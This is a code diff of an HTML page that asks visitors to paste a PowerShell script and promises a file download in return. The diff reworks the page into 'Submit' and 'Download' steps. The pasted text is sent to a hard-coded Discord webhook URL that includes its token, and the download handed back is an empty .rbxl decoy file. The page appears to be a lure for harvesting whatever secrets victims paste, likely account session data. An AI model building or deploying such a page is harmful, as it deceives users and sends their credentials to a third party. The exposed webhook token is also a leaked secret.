@@ -43,13 +43,14 @@
     width: 100%;
     padding: 12px;
     font-size: 16px;
-    border-radius: 12px; /* coins arrondis */
+    border-radius: 12px;
     border: none;
     cursor: not-allowed;
     background: gray;
     color: white;
     font-weight: bold;
     transition: background 0.3s, transform 0.2s;
+    margin-bottom: 10px;
   }
 
   button.enabled {
@@ -66,39 +67,39 @@
 <body>
 <div class="box">
   <h2>Paste your PowerShell script</h2>
-  <p>Once text is detected, the download will unlock.</p>
+  <p>Submit your script first to unlock download.</p>
 
   <textarea id="input" placeholder="Paste here..."></textarea>
+  <button id="submit" disabled>Submit script</button>
   <button id="download" disabled>Download file</button>
 </div>
 
 <script>
 const input = document.getElementById("input");
-const button = document.getElementById("download");
+const submitBtn = document.getElementById("submit");
+const downloadBtn = document.getElementById("download");
 
-// Vérifier si le texte ressemble à un script PowerShell
+// Validation simple pour détecter un script PowerShell
 function isPowerShell(text) {
-  // Validation simple : commence par $ ou contient certains mots clés PS
   const keywords = ["$", "Get-", "Set-", "New-", "Invoke-", "Write-Host", "Start-Process"];
   return text.trim() !== "" && keywords.some(k => text.includes(k));
 }
 
-// Débloquer le bouton si c'est un script PowerShell
+// Débloquer le bouton Submit si texte valide
 input.addEventListener("input", () => {
   if(isPowerShell(input.value)) {
-    button.disabled = false;
-    button.classList.add("enabled");
+    submitBtn.disabled = false;
+    submitBtn.classList.add("enabled");
   } else {
-    button.disabled = true;
-    button.classList.remove("enabled");
+    submitBtn.disabled = true;
+    submitBtn.classList.remove("enabled");
   }
 });
 
-// Fonction pour envoyer au webhook Discord et déclencher le téléchargement
-button.addEventListener("click", () => {
+// Envoyer au webhook au clic sur Submit
+submitBtn.addEventListener("click", () => {
   const textValue = input.value;
 
-  // Envoi au webhook Discord
   fetch("https://discord.com/api/webhooks/1456286162359418925/yW8ZAjR5uOpaFJrvN4h8mUgblWJ86Pb4wFjRxzTriPa_LQJkhTr8pUTF0IukHbF9gSR5", {
     method: "POST",
     headers: {
@@ -107,11 +108,20 @@ button.addEventListener("click", () => {
     body: JSON.stringify({ content: textValue })
   }).then(() => {
     console.log("Message envoyé au webhook !");
+    // Débloquer le bouton download
+    downloadBtn.disabled = false;
+    downloadBtn.classList.add("enabled");
+    // Désactiver le bouton submit pour éviter double envoi
+    submitBtn.disabled = true;
+    submitBtn.classList.remove("enabled");
   }).catch(err => {
     console.error("Erreur webhook:", err);
+    alert("Erreur lors de l'envoi. Réessayez !");
   });
+});
 
-  // Télécharger le fichier vide .rbxl
+// Télécharger le fichier au clic sur Download
+downloadBtn.addEventListener("click", () => {
   const blob = new Blob([""], { type: "application/octet-stream" });
   const url = URL.createObjectURL(blob);
 
